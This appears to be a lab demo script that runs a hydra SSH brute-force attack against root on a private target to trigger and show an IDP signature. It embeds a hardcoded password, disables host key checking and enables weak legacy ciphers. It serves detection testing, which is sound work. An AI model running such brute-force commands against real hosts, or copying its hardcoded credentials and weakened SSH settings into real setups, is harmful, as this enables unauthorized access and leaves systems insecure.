#!/bin/bash
# SSH brute force attack from Kali using hydra
# Triggers: SSH:BRUTE-LOGIN IDP signature

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"
WORDLIST="/usr/share/wordlists/fasttrack.txt"

echo "=== SSH Brute Force Attack — hydra ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET}:22)"
echo "Tool     : hydra"
echo "Wordlist : fasttrack.txt (222 passwords)"
echo ""
echo "WITHOUT IDP: hydra runs at ~40-60 tries/min, exhausts wordlist"
echo "WITH IDP:    SSH:BRUTE-LOGIN fires, connections dropped — rate collapses to <10 tries/min"
echo ""
echo "Starting brute force (Ctrl+C to stop early — the slowdown IS the demo)..."
echo ""

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "hydra -l root -P ${WORDLIST} -t 4 -I ${TARGET} ssh 2>&1" 2>/dev/null

echo ""
echo "Attack complete. Check IDP hit counters:"
echo "  bash /root/lab/idp-demo/monitor-idp.sh"
